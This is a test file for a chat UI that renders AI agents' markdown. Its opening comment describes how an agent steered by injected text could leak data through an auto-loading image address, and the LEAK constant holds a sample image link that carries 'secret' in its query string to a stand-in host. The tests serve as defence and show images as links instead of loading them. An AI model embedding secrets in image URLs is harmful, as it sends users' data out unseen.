// Markdown in chat is mostly text an agent wrote, and an image in it would load
// from wherever its address points the moment it is shown: an agent steered by
// something it read could send data out in that address. No image ever loads;
// a web or same-site image is a link the person can choose to open, and any
// other address is only named.

import { cleanup, render, screen, within } from '@testing-library/react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { afterEach, describe, expect, it } from 'vitest'

import { ThemeProvider } from '@/features/theme/ThemeProvider'

import { MD_COMPONENTS, StreamingCard } from '../chatComponents'

afterEach(() => cleanup())

const LEAK = '![the chart](https://images.example/p.png?d=secret)'

function renderMarkdown(text: string) {
  return render(
    <div data-testid="md">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={MD_COMPONENTS}>
        {text}
      </ReactMarkdown>
    </div>,
  )
}

describe('markdown images', () => {
  it('draws a web image as a link to open, and loads nothing', () => {
    renderMarkdown(`Here it is.\n\n${LEAK}`)
    const md = screen.getByTestId('md')
    expect(md.querySelector('img')).toBeNull()
    const link = within(md).getByRole('link', { name: 'Image: the chart' })
    expect(link).toHaveAttribute('href', 'https://images.example/p.png?d=secret')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow')
  })

  it('links a same-site image too, and says Image when there is no alt text', () => {
    renderMarkdown('![](/api/artifacts/a1.png)')
    const link = within(screen.getByTestId('md')).getByRole('link', { name: 'Image' })
    expect(link).toHaveAttribute('href', '/api/artifacts/a1.png')
  })

  it('only names an image whose address is not a web or same-site one', () => {
    renderMarkdown('![pixel](data:image/png;base64,AAAA)')
    const md = screen.getByTestId('md')
    expect(md.querySelector('img')).toBeNull()
    expect(within(md).queryByRole('link')).toBeNull()
    expect(within(md).getByText('Image: pixel')).toBeInTheDocument()
  })

  it('loads no image from a reply while it streams in', () => {
    render(
      <ThemeProvider>
        <StreamingCard text={`Working on it.\n\n${LEAK}`} agentId="a1" agentName="Coder" />
      </ThemeProvider>,
    )
    expect(document.querySelector('img')).toBeNull()
    expect(screen.getByRole('link', { name: 'Image: the chart' })).toBeInTheDocument()
  })
})
